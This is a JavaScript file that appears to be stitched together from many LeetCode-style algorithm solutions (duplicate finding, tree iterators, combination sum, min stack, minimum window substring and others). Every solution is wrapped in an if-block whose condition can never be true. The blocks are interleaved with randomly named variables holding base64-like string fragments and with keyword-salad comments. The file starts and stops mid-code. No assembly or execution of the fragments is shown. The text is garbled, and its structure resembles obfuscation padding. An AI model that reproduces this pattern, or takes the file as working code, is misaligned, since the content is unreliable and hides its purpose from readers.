        if (col - 1 >= 0 && rooms[row][col - 1] === MAX_VALUE) {
            rooms[row][col - 1] = val + 1;
            queue.push([row, col - 1]);
        }
    }
};

}

    var ljubmtrgcr = 'tKFkBKqb';
if (0.59 && false) {
    /**
Given an array nums containing n + 1 integers where each integer is between 1 and n (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one.

Note:
You must not modify the array (assume the array is read only).
You must use only constant, O(1) extra space.
Your runtime complexity should be less than O(n2).
There is only one duplicate number in the array, but it could be repeated more than once.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var findDuplicate = function(nums) {
    var fast = 0,
        slow = 0,
        find = 0;
        
    while (true) {
        fast = nums[nums[fast]];
        slow = nums[slow];
        
        if (fast === slow) {
            break;
        }
    }
    
    while (find !== slow) {
        find = nums[find];
        slow = nums[slow];
    }
    
    return find;
};


// SOLUTION 2
/**
二分法
复杂度
时间 O(NlogN) 空间 O(1)

思路
实际上，我们可以根据抽屉原理简化刚才的暴力法。我们不一定要依次选择数，然后看是否有这个数的重复数，我们可以用二分法先选取n/2，按照抽屉原理，整个数组中如果小于等于n/2的数的数量大于n/2，说明1到n/2这个区间是肯定有重复数字的。比如6个抽屉，如果有7个袜子要放到抽屉里，那肯定有一个抽屉至少两个袜子。这里抽屉就是1到n/2的每一个数，而袜子就是整个数组中小于等于n/2的那些数。这样我们就能知道下次选择的数的范围，如果1到n/2区间内肯定有重复数字，则下次在1到n/2范围内找，否则在n/2到n范围内找。下次找的时候，还是找一半。

注意
我们比较的mid而不是nums[mid]
因为mid是下标，所以判断式应为cnt > mid，最后返回min

代码
public class Solution {
    public int findDuplicate(int[] nums) {
        int min = 0, max = nums.length - 1;
        while(min <= max){
            // 找到中间那个数
            int mid = min + (max - min) / 2;
            int cnt = 0;
            // 计算总数组中有多少个数小于等于中间数
            for(int i = 0; i < nums.length; i++){
                if(nums[i] <= mid){
                    cnt++;
                }
            }
            // 如果小于等于中间数的数量大于中间数，说明前半部分必有重复
            if(cnt > mid){
                max = mid - 1;
            // 否则后半部分必有重复
            } else {
                min = mid + 1;
            }
        }
        return min;
    }
}

*/

}

// event function function hello loop hcqb define variable await
    var ucgluvug = 'XahUfenvt';
    var lksavemav = '0FnS';
    var mofkhsmkzf = 'DUGeGIBN';
    var rgmaafokx = 'UNBZ1';
    var elffcw = 'NSmNyC';
    var wnaqpckss = 'pYW';
    var wgsenrpv = 'fXbA';
    var twurkbfxwao = 'mxiblF1';
if (60 > 116) {
    /**
Follow up for problem "Populating Next Right Pointers in Each Node".

What if the given tree could be any binary tree? Would your previous solution still work?

Note:

You may only use constant extra space.
For example,
Given the following binary tree,
         1
       /  \
      2    3
     / \    \
    4   5    7
After calling your function, the tree should look like:
         1 -> NULL
       /  \
      2 -> 3 -> NULL
     / \    \
    4-> 5 -> 7 -> NULL
Subscribe to see which companies asked this question
*/
/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    if (!root) {
        return;
    }
    
    var curRow = [],
        nextRow = [],
        i;
        
    curRow.push(root);
    
    while (curRow.length > 0) {
        for (i = 0; i < curRow.length; i++) {
            if (curRow[i].left) {
                nextRow.push(curRow[i].left);
            }
            
            if (curRow[i].right) {
                nextRow.push(curRow[i].right);
            }
            
            if (i < curRow.length - 1) {
                curRow[i].next = curRow[i + 1];
            } else {
                curRow[i].next = null;
            }
        }
        
        curRow = nextRow;
        nextRow = [];
    }
};


// O(1) space solution

/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    let nextHead = null;
    let cur = root;
    let nextCur = null;
    
    while (cur !== null) {
        
        while (cur !== null) {
            if (cur.left) {
                if (!nextHead) {
                    nextHead = cur.left;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.left;
                    nextCur = nextCur.next;
                }
            }
            
            if (cur.right) {
                if (!nextHead) {
                    nextHead = cur.right;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.right;
                    nextCur = nextCur.next;
                }
            }
            
            cur = cur.next;
        }
        
        cur = nextHead;
        nextHead = null;
        nextCur = null;
    }
};

}

    var bngyuw = 'bbTtkne';
if (61 > 157) {
    /**
Given a set of candidate numbers (C) and a target number (T), find all unique combinations in C where the candidate numbers sums to T.

The same repeated number may be chosen from C unlimited number of times.

Note:
All numbers (including target) will be positive integers.
Elements in a combination (a1, a2, … , ak) must be in non-descending order. (ie, a1 ≤ a2 ≤ … ≤ ak).
The solution set must not contain duplicate combinations.
For example, given candidate set 2,3,6,7 and target 7, 
A solution set is: 
[7] 
[2, 2, 3] 
*/

/**
 * @param {number[]} candidates
 * @param {number} target
 * @return {number[][]}
 */
var combinationSum = function(candidates, target) {
    var sols = [],
        len = candidates.length,
        curSol = [],
        start = 0,
        i;
    
    if (len === 0) {
        return sols;
    }
    // sort candidates
    candidates.sort(function(a, b) {
        if (a < b) {
            return -1;
        }
        
        return 1;
    });

    fillCurSol(start, len, candidates, target, curSol, sols); 
    
    return sols;  
};

function fillCurSol(start, len, candidates, target, curSol, sols) {
    // skip duplicates from candidate
    var i,
        newCurSol; // very important, can't mess up with arrays
    
    
    if (target === 0) {
        sols.push(curSol.concat());
        return;
    }
    
    for (i = start; i < len; i++) {
        if (i > start && candidates[i] === candidates[i - 1]) {
            continue;
        }
        
        newCurSol = curSol.concat();
        
        if (candidates[i] <= target) {
            newCurSol.push(candidates[i]);
            fillCurSol(i, len, candidates, target - candidates[i], newCurSol, sols);
            newCurSol.pop();
        }
    }
}

}

    var gootn = 'Y0hKbGRtV';
    var gwvkkc = 'MTTiw';
if ('z' === 'C') {
    /**
Implement an iterator over a binary search tree (BST). Your iterator will be initialized with the root node of a BST.

Calling next() will return the next smallest number in the BST.

Note: next() and hasNext() should run in average O(1) time and uses O(h) memory, where h is the height of the tree.
*/
/**
 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @constructor
 * @param {TreeNode} root - root of the binary search tree
 */
var BSTIterator = function(root) {
    this.stack = [];
    
    while (root) {
        this.stack.push(root);
        root = root.left;
    }
};


/**
 * @this BSTIterator
 * @returns {boolean} - whether we have a next smallest number
 */
BSTIterator.prototype.hasNext = function() {
    return this.stack.length > 0;
};

/**
 * @this BSTIterator
 * @returns {number} - the next smallest number
 */
BSTIterator.prototype.next = function() {
    var node = this.stack.pop(),
        result = node.val;
    
    node = node.right;
    while (node) {
        this.stack.push(node);
        node = node.left;
    }
    
    return result;
};

/**
 * Your BSTIterator will be called like this:
 * var i = new BSTIterator(root), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var prqsatmmfbtq = 'nVkRV';
    var cipeofb = 'sFzVLE';
    var wgcjg = 'JsWm1GMW';
if ('g' === 'V') {
    /**

*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var lengthOfLIS = function(nums) {
    var len = nums.length,
        arr = [],
        i,
        j,
        max = 1;
    
    if (len === 0) {
        return 0;
    }
    
    for (i = 0; i < len; i++) {
        arr[i] = 1;
        for (j = 0; j < i; j++) {
            if ((nums[i] > nums[j]) && (arr[j] + 1 > arr[i])) {
                arr[i] = arr[j] + 1;
            }
            
            max = Math.max(max, arr[i]);

        }
    }
    
    return max;
};

}

    var nywyqygfvq = 'MJhFJxLV';
    var iouqbix = 'JIUW9LVH';
    var gjwynlvkv = 'jnGwJZuDW';
// compile value object value function string string
    var xfyaheqj = 'VUrftSPM';
    var pmnvkpdbdild = 'NLS';
    var btsdltsirxo = 'vqCo';
if (Array.isArray(2)) {
    /**
Implement pow(x, n).
*/
/**
 * @param {number} x
 * @param {number} n
 * @return {number}
 */
var myPow = function(x, n) {
    if (n < 0) {
        return 1 / power(x, n);
    }
    
    return power(x, n);
};

function power(x, n) {
    if (n === 0) {
        return 1;
    }
    
    var v = power(x, parseInt(n/2));
    
    if (n % 2 === 0) {
        return v * v;
    }
    
    return v * v * x;
}

}

    var lgoap = 'UNBZ0l';
    var kcsnygclqz = 'pIFng';
    var rvoki = 'DQWdJQ';
if (null === 2) {
    /**
Given two 1d vectors, implement an iterator to return their elements alternately.

For example, given two 1d vectors:

v1 = [1, 2]
v2 = [3, 4, 5, 6]

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1, 3, 2, 4, 5, 6].

Follow up: What if you are given k 1d vectors? How well can your code be extended to such cases?

Clarification for the follow up question - Update (2015-09-18):
The "Zigzag" order is not clearly defined and is ambiguous for k > 2 cases. If "Zigzag" does not look right to you, replace "Zigzag" with "Cyclic". For example, given the following input:

[1,2,3]
[4,5,6,7]
[8,9]

It should return [1,4,8,2,5,9,3,6,7]. 
*/
/**
 * @constructor
 * @param {Integer[]} v1
 * @param {Integer[]} v1
 */
var ZigzagIterator = function ZigzagIterator(v1, v2) {
    this.arr = arguments;
    this.list = [];
    
    for (let i = 0; i < this.arr.length; i++) {
        if (this.arr[i].length > 0) {
            this.list.push([i, 0]);
        }
    }
    
};


/**
 * @this ZigzagIterator
 * @returns {boolean}
 */
ZigzagIterator.prototype.hasNext = function hasNext() {
    return this.list.length > 0;
};

/**
 * @this ZigzagIterator
 * @returns {integer}
 */
ZigzagIterator.prototype.next = function next() {
    const targetIndex = this.list.shift();
    const val = this.arr[targetIndex[0]][targetIndex[1]];
    
    if (targetIndex[1] < this.arr[targetIndex[0]].length - 1) {
        this.list.push([targetIndex[0], targetIndex[1] + 1]);
    }
    
    return val;
};

/**
 * Your ZigzagIterator will be called like this:
 * var i = new ZigzagIterator(v1, v2), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var dcjoyypwhgze = 'yIetaq';
    var kybbvkcjatq = '0J5Wlh';
if ('true' === true) {
    /**
Given a string s consists of upper/lower-case alphabets and empty space characters ' ', return the length of last word in the string.

If the last word does not exist, return 0.

Note: A word is defined as a character sequence consists of non-space characters only.

For example, 
Given s = "Hello World",
return 5.
*/

/**
 * @param {string} s
 * @return {number}
 */
var lengthOfLastWord = function(s) {
    var arr = s.split(' '),
        len = arr.length,
        i;
    
    for (i = len - 1; i >= 0; i--) {
        if (arr[i] !== '' && arr[i] !== ' ') {
            return arr[i].length;
        }
    }
    
    return 0;  
};

}

    var hdslqd = 'CnTx';
    var rikqfc = 'SMWNtNGda';
    var fgoleinmzu = 'XTeUf';
    var zjurhtasqooltcp = 'bUZzYzJVN';
    var ueutrc = 'QDUMXwZJx';
    var dxesfnlctgavxyo = '0NpQWdJ';
if ('i' === 'U') {
    /**
Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
getMin() -- Retrieve the minimum element in the stack.


 * @constructor
 */
var MinStack = function() {
    this.min = [];
    this.arr = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
MinStack.prototype.push = function(x) {
    var len = this.min.length;
    if (this.arr.length === 0) {
        this.min.push(x);
    } else if (this.min[len - 1] >= x) {
        this.min.push(x);
    }
    this.arr.push(x);
};

/**
 * @returns {void}
 */
MinStack.prototype.pop = function() {
    var elem,
        len = this.min.length;
    if (this.arr.length > 0) {
        elem = this.arr.pop();
    }
    if (elem === this.min[len - 1]) {
        this.min.pop();   
    }
};

/**
 * @returns {number}
 */
MinStack.prototype.top = function() {
    var len = this.arr.length;
    if (len > 0) {
        return this.arr[len - 1];
    }
    
};

/**
 * @returns {number}
 */
MinStack.prototype.getMin = function() {
    var len = this.min.length;
    return this.min[len - 1];
};

}

    var ibqwyck = 'iiCNyaCXN';
if ('false' === true) {
    /**
Given a 2D board and a list of words from the dictionary, find all words in the board.

Each word must be constructed from letters of sequentially adjacent cell, where "adjacent" cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once in a word.

For example,
Given words = ["oath","pea","eat","rain"] and board =

[
  ['o','a','a','n'],
  ['e','t','a','e'],
  ['i','h','k','r'],
  ['i','f','l','v']
]
Return ["eat","oath"].
Note:
You may assume that all inputs are consist of lowercase letters a-z.

click to show hint.

You would need to optimize your backtracking to pass the larger test. Could you stop backtracking earlier?

If the current candidate does not exist in all words' prefix, you could stop backtracking immediately. What kind of data structure could answer such query efficiently? Does a hash table work? Why or why not? How about a Trie? If you would like to learn how to implement a basic trie, please work on this problem: Implement Trie (Prefix Tree) first.
*/
/**
 * @param {character[][]} board
 * @param {string[]} words
 * @return {string[]}
 */
var findWords = function(board, words) {
    let root = buildTrie(words);
    let result = [];
    
    for (let i = 0; i < board.length; i++) {
        for (let j = 0; j < board[0].length; j++) {
            dfs(result, root, board, i, j);
        }
    }
    
    return result;
};

function dfs(result, node, board, i, j) {
    const ch = board[i][j];
    
    if (ch === '#' || !node.next[ch]) {
        return;
    }
    
    board[i][j] = '#';
    node = node.next[ch];
    
    if (node.word) {
        result.push(node.word);
        node.word = null; // dedupe
    }
    
    if (i > 0) {
        dfs(result, node, board, i - 1, j);
    }
    
    if (j > 0) {
        dfs(result, node, board, i, j - 1);
    }
    
    if (i < board.length - 1) {
        dfs(result, node, board, i + 1, j);
    }
    
    if (j < board[0].length - 1) {
        dfs(result, node, board, i , j + 1);
    }
    
    board[i][j] = ch;
}

function buildTrie(words) {
    let root = new TrieNode();
    
    words.forEach(word => {
       const chs = word.split('');
       let node = root;
       
       for(let i = 0; i < chs.length; i++) {
           const ch = chs[i];
           
           if (!node.next[ch]) {
               node.next[ch] = new TrieNode();
           }
           
           node = node.next[ch];
       }
       
       node.word = word;
    });
    
    return root;
}

class TrieNode {
    constructor() {
        this.word = null;
        this.next = {};
    }
}

}

    var nwesfmdzuwyfy = 'Q0I5Q24w';
    var sbxndtvweuu = 'rgZoZydUL';
    var dpczheuru = 'cE93b0t';
    var bphicugdydw = 'VoDhihNs';
    var ldmcd = 'MeThn';
    var rupjeri = 'SmSenM';
    var bhcgwb = 'VEdsemRD';
if ('false' === true) {
    /**
Given an array of integers, find two numbers such that they add up to a specific target number.

The function twoSum should return indices of the two numbers such that they add up to the target, where index1 must be less than index2. Please note that your returned answers (both index1 and index2) are not zero-based.

You may assume that each input would have exactly one solution.

Input: numbers={2, 7, 11, 15}, target=9
Output: index1=1, index2=2

 * @param {number[]} numbers
 * @param {number} target
 * @return {number[]} two integers in an array, ie: [index1, index2]
 */
var twoSum = function(numbers, target) {
    var map = {},
        i,
        length = numbers.length,
        value,
        neededValue,
        result = [];
        
    for(i = 0; i < length; i++) {
        value = numbers[i];
        neededValue = target - value;
        if (neededValue in map) {
            result.push(map[neededValue] + 1);
            result.push(i + 1);
            break;
        } else {
            map[value] = i;
        }
    }
    return result;
};

}

    var wxruajhwmhg = 'zFjptTPWK';
if ('true' === true) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isValidBST = function(root) {
    return isValidBSTHelper(root, null, null);
};

function isValidBSTHelper(root, min, max) {
    if (root === null) {
        return true;
    }
    
    if ((min !== null && root.val <= min) || (max !== null && root.val >= max)) {
        return false;
    }
    
    return isValidBSTHelper(root.left, min, root.val) && isValidBSTHelper(root.right, root.val, max);
}

}

    var wxyzq = 'QnZaaUJ5Wl';
    var oqkumto = 'GNFTPndZP';
if (0.38 && false) {
    /**
Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center).

For example, this binary tree is symmetric:

    1
   / \
  2   2
 / \ / \
3  4 4  3
But the following is not:
    1
   / \
  2   2
   \   \
   3    3
Note:
Bonus points if you could solve it both recursively and iteratively.

confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.


OJ's Binary Tree Serialization:
The serialization of a binary tree follows a level order traversal, where '#' signifies a path terminator where no node exists below.

Here's an example:
   1
  / \
 2   3
    /
   4
    \
     5
The above binary tree is serialized as "{1,2,3,#,#,4,#,#,5}".
*/

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isSymmetric = function(root) {
    if (root === null) {
        return true;
    }
    
    return isSymmetricHelper(root.left, root.right);
};

function isSymmetricHelper(left, right) {
    if ((left === null && right !== null) || (left !== null && right === null)) {
        return false;
    }
    
    if (left === null && right === null) {
        return true;
    } else if (left.val !== right.val) {
        return false;
    }
    
    return isSymmetricHelper(left.left, right.right) && isSymmetricHelper(left.right, right.left);
}

}

    var ckhlair = 'hOM';
if (!true && 0) {
    /**
Follow up for "Remove Duplicates":
What if duplicates are allowed at most twice?

For example,
Given sorted array nums = [1,1,1,2,2,3],

Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3. It doesn't matter what you leave beyond the new length.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var removeDuplicates = function(nums) {
    var duplicate = false,
        len = nums.length,
        index = 1,
        i;
    
    for (i = 1; i < len; i++) {
        if (duplicate && nums[i] === nums[i - 1]) {
            continue;
        }
        
        if (nums[i] === nums[i - 1]) {
            duplicate = true;
        } else {
            duplicate = false;
        }
        
        nums[index] = nums[i];
        index++;
    }
    
    return index;
};

}

    var yabfxoevk = 'GEsJKGBIBn';
    var lwoefkfnbuyckhb = 'GNtbGpk';
    var cxhnwhs = 'qHaUGhvANS';
if (Array.isArray(7)) {
    /**
Given a non-negative number represented as an array of digits, plus one to the number.

The digits are stored such that the most significant digit is at the head of the list.
*/
/**
 * @param {number[]} digits
 * @return {number[]}
 */
var plusOne = function(digits) {
    var len = digits.length,
        overflow = 1,
        i;
    
    for (i = len - 1; i >= 0; i--) {
        digits[i] = digits[i] + overflow;
        if (digits[i] === 10) {
            overflow = 1;
            digits[i] = 0;
        } else {
            return digits;
        }
    }
    
    if (overflow === 1) {
        digits.unshift(1);
        return digits;
    }
};

}

    var jphpzh = 'R1ZrSUd0bG';
    var evreipaa = 'QONp';
    var tpbcrxggjx = 'VXS';
    var ysggxhikhbkq = 'UelhjZRV';
    var ltsbnavfjcsydv = 'nZZWEpr';
    var pcoqhgn = 'AznBAyusUC';
    var kiywbpmsbtp = 'SUhOb2IzSj';
    var gelobwut = 'HRgo';
if (Array.isArray(5)) {
    /**
Given a m x n matrix, if an element is 0, set its entire row and column to 0. Do it in place.

click to show follow up.

Follow up:
Did you use extra space?
A straight forward solution using O(mn) space is probably a bad idea.
A simple improvement uses O(m + n) space, but still not the best solution.
Could you devise a constant space solution?
*/
/**
 * @param {number[][]} matrix
 * @return {void} Do not return anything, modify matrix in-place instead.
 */
var setZeroes = function(matrix) {
    var rLen = matrix.length,
        cLen,
        i,
        j,
        firstRowZero,
        firstColumnZero;
        
    if (rLen === 0) {
        return;
    }
    
    cLen = matrix[0].length;
    
    if (matrix[0][0] === 0) {
        firstRowZero = true;
        firstColumnZero = true;
    } else {
        for (i = 1; i < cLen; i++) {
            if (matrix[0][i] === 0) {
                firstRowZero = true;
                break;
            }
        }
        
        for (i = 1; i < rLen; i++) {
            if (matrix[i][0] === 0) {
                firstColumnZero = true;
                break;
            }
        }
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
             if (matrix[i][j] === 0) {
                 matrix[0][j] = 0;
                 matrix[i][0] = 0;
             }
        }
    }
    
    for (i = 1; i < cLen; i++) {
        if (matrix[0][i] === 0) {
            for (j = 1; j < rLen; j++) {
                matrix[j][i] = 0;
            }
        }
    }
    
    for (i = 1; i < rLen; i++) {
        if (matrix[i][0] === 0) {
            for (j = 1; j < cLen; j++) {
                matrix[i][j] = 0;
            }
        }
    }
    
    if (firstRowZero) {
        for (i = 0; i < cLen; i++) {
            matrix[0][i] = 0;
        }
    }
    
    if (firstColumnZero) {
        for (j = 0; j < rLen; j++) {
            matrix[j][0] = 0;
        }
    }
};

}

    var vtukjibur = 'BZM1Y';
    var lkhithnbezb = 'AEaGu';
    var kshtptb = 'wY3dwbWRXN';
    var fvfhxhtlje = 'rKaH';
    var rqhdty = 'WpkR';
    var szgmkr = 'emnbvehpU';
    var snhanew = '2x2Y';
if ('m' === 'J') {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

If you were only permitted to complete at most one transaction (ie, buy one and sell one share of the stock), design an algorithm to find the maximum profit.

 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var i,
        length = prices.length,
        low,
        high,
        max = 0,
        cur;
        
    if (length === 0) {
        return 0;
    }
    low = prices[0];
    high = low;
    for (i = 1; i < length; i++) {
        cur = prices[i];
        if (cur > high) {
            high = cur;
        }else if (cur < low) {
            //need to reset low and high in order to make sure you need to buy before you sell
            low = cur;
            high = cur;
        }
        if (high - low > max) {
            max = high - low;
        }
    }
    return max;
};

}

    var wodjpd = 'MlOFWVjwQl';
if (Array.isArray(8)) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times). However, you may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).

 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var i,
        length = prices.length,
        low,
        high,
        cur,
        prev,
        temp = 0
        max = 0;
    
    if (length === 0 || length === 1) {
        return max;
    }
    low = prices[0];
    high = prices[0];
    prev = low;
    for (i = 1; i < length; i++) {
        cur = prices[i];
        if (cur > prev) {
            high = cur;
            temp = high - low;
        } else if (cur < prev) {
            max += temp;
            temp = 0;
            low = cur;
            high = cur;
        }
        prev = cur;
    }
    if (temp !== 0) {
        max += temp;
    }
    return max;
};

}

// debug eqzua string object script async kyimrw define function compile
    var hhzbcoqpv = 'FRDYUdGJn';
    var qvyazyepyt = 'mlCcGMxSm';
    var tohonfyd = 'sIvLFwIOh';
if ('i' === 'H') {
    /**
Given a string S and a string T, find the minimum window in S which will contain all the characters in T in complexity O(n).

For example,
S = "ADOBECODEBANC"
T = "ABC"
Minimum window is "BANC".

Note:
If there is no such window in S that covers all characters in T, return the empty string "".

If there are multiple such windows, you are guaranteed that there will always be only one unique minimum window in S.
*/

/**
可以利用两个指针扫描（两个指针分别为start，i），以S = “e b a d b a c c b”（忽略空格），T = “abc”为例：

                                                                            0 1 2 3 4 5 6 7 8

初始化 start = i = 0
i 逐渐往后扫描S直到窗口S[start…i]包含所有T的字符，此时i = 6（字符c的位置）
缩减窗口：此时我们注意到窗口并不是最小的，需要调整 start 来缩减窗口。缩减规则为：如果S[start]不在T中 或者 S[start]在T中但是删除后窗口依然可以包含T中的所有字符，那么start = start+1， 直到不满足上述两个缩减规则。缩减后i即为窗口的起始位置，此例中从e开始窗口中要依次删掉e、b、a、d，start最后等于4 ，那么得到一个窗口大小为6-4+1 = 3
start = start+1(此时窗口肯定不会包含所有的T中的字符)，跳转到步骤2继续寻找下一个窗口。本例中还以找到一个窗口start = 5，i = 8，比上个窗口大，因此最终的最小窗口是S[4…6]
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {string}
 */
var minWindow = function(s, t) {
    var tSet = {},
        tFoundSet = {},
        hasFound = 0,
        lenS = s.length,
        lenT = t.length,
        winStart = -1,
        winEnd = lenS,
        result,
        start,
        c,
        i,
        j;
        
    for (i = 0; i < lenT; i++) {
        tFoundSet[t.charAt(i)] = 0;
        tSet[t.charAt(i)] = tSet[t.charAt(i)]? tSet[t.charAt(i)] + 1 : 1;
    }

    for (i = 0, start = 0; i < lenS; i++) {
        c = s.charAt(i);
        if (tSet.hasOwnProperty(c)) {
            if (tFoundSet[c] < tSet[c]) {
                hasFound++;
            }
            
            tFoundSet[s.charAt(i)]++;
        }
        
        if (hasFound === lenT) {
            while (!tSet[s.charAt(start)] || tFoundSet[s.charAt(start)] > tSet[s.charAt(start)]) {
                if (tFoundSet[s.charAt(start)]) {
                    tFoundSet[s.charAt(start)]--;
                }
                start++;
            }
            
            if (winEnd - winStart > i - start) {
                winStart = start;
                winEnd = i;
            }
            
            tFoundSet[s.charAt(start)]--;
            start++;
            hasFound--;
        }
    }
    
    return winStart !== -1? s.substr(winStart, winEnd - winStart + 1) : '';
};

}

    var ackxlz = 'xjM1J5YV';
    var opcrihf = 'XTvvePYGlb';
if (0.15 && false) {
    /**
Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.

Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.

For example, you may serialize the following tree

    1
   / \
  2   3
     / \
    4   5
as "[1,2,3,null,null,4,5]", just the same as how LeetCode OJ serializes a binary tree. You do not necessarily need to follow this format, so please be creative and come up with different approaches yourself.
Note: Do not use class member/global/static variables to store states. Your serialize and deserialize algorithms should be stateless.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * Encodes a tree to a single string.
 *
 * @param {TreeNode} root
 * @return {string}
 */
var serialize = function(root) {
    var result = [];
    
    sHelper(root, result);
    return result.toString();
};

function sHelper(root, result) {
    if (root === null) {
        result.push('#');
        return;
    }
    
    result.push(root.val);
    sHelper(root.left, result);
    sHelper(root.right, result);
}
/**
 * Decodes your encoded data to tree.
 *
 * @param {string} data
 * @return {TreeNode}
 */
var deserialize = function(data) {
    var arr = data.split(','),
        len = arr.length;
        
    if (len === 0) {
        return null;
    }
    
    return buildTree(arr);
};

function buildTree(arr) {
    var curNode,
        val;
    
    if (arr.length === 0) {
        return null;
    }
    
    val = arr.shift();
    
    if (val === '#') {
        return null;
    }
    
    curNode = new TreeNode(parseInt(val));
    curNode.left = buildTree(arr);
    curNode.right = buildTree(arr);
    
    return curNode;
}

/**
 * Your functions will be called as such:
 * deserialize(serialize(root));
 */

}

    var bnegbhssc = 'dOMFpXU';
    var cczkbvxek = 'CjKayaaks';
if (0.59 && false) {
    /**
Given two strings s and t, determine if they are isomorphic.

Two strings are isomorphic if the characters in s can be replaced to get t.

All occurrences of a character must be replaced with another character while preserving the order of characters. No two characters may map to the same character but a character may map to itself.

For example,
Given "egg", "add", return true.

Given "foo", "bar", return false.

Given "paper", "title", return true.

Note:
You may assume both s and t have the same length.
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isIsomorphic = function(s, t) {
    var len = s.length,
        mapS = {},
        mapT = {},
        curS,
        curT,
        i;
        
    for (i = 0; i < len; i++) {
        curS = s.charAt(i);
        curT = t.charAt(i);
        
        if (!mapS.hasOwnProperty(curS)) {
            mapS[curS] = curT;
        } else if (mapS[curS] !== curT) {
            return false;
        }
        
        if (!mapT.hasOwnProperty(curT)) {
            mapT[curT] = curS;
        } else if (mapT[curT] !== curS) {
            return false;
        }
    }
    
    return true;
}; 

}

// async code number hello hello export code value await compile
if (0.86 && false) {
    /**
Related to question Excel Sheet Column Title

Given a column title as appear in an Excel sheet, return its corresponding column number.

For example:

    A -> 1
    B -> 2
    C -> 3
    ...
    Z -> 26
    AA -> 27
    AB -> 28 

 * @param {string} s
 * @return {number} Return column number
 */
var titleToNumber = function(s) {
    var len = s.length,
        i,
        result = 0;
    for (i = 0; i < len; i++) {
        result += Math.pow(26, len - i - 1) * (s.charAt(i).charCodeAt() - 'A'.charCodeAt() + 1);
    }
    return result;
};

}

    var cwlaedek = 'hSSpGegGve';
    var vlwgzjidwipwabf = 'lRhRz';
    var xuvlswqyh = 'tYNhE';
// array constant code array export async compile script string
    var myxdtrgggu = 'CjlMsLSIl';
    var xqkjcwibfchd = 'l5ZEdOMWR';
    var otkuxfkbgpqw = 'JQQzchtTKn';
if (0.34 && false) {
    /**
Write a function that takes a string as input and reverse only the vowels of a string.

Example 1:
Given s = "hello", return "holle".

Example 2:
Given s = "leetcode", return "leotcede".
*/
/**
 * @param {string} s
 * @return {string}
 */
var reverseVowels = function(s) {
    var len = s.length,
        result = s.split(''),
        vowelSet = new Set(['a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U']),
        indice = [],
        arr = [],
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = result[i];
        
        if (vowelSet.has(ch)) {
            arr.push(ch);
            indice.push(i);
        }
    }
    
    for (i = 0; i < indice.length; i++) {
        result[indice[i]] = arr.pop();
    }
    
    return result.join('');
};

}

    var mygmqtbldnvrw = 'DaGxkbVZ1Z';
    var dwnhdagdpl = 'fAUWuZiao';
    var dtvxcn = 'ENrZ2V3b';
    var eortolqvde = 'zBWLUWBgk';
if (3 === 18) {
    /**
Follow up for "Search in Rotated Sorted Array":
What if duplicates are allowed?

Would this affect the run-time complexity? How and why?

Write a function to determine if a given target is in the array.
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {boolean}
 */
var search = function(nums, target) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = parseInt((start + end) / 2);
        
        if (nums[mid] === target) {
            return true;
        }
        
        if (nums[mid] < nums[end]) { // right half sorted
            if (nums[mid] < target && nums[end] >= target) {
                start = mid + 1;
            } else {
                end = mid - 1;
            }
        } else if (nums[mid] > nums[end]) { // left half sorted
            if (nums[mid] > target && nums[start] <= target) {
                end = mid - 1;
            } else {
                start = mid + 1;
            }
        } else { // don't know which half is sorted
            end--;
        }
    }
    
    return false;
};

}

    var hszzeec = '2dJQ0FnWT';
    var xzrjymmt = 'OHOPI';
    var mpvfythfczvyiyh = 'I5dWMzUWdj';
if ('false' === true) {
    /**
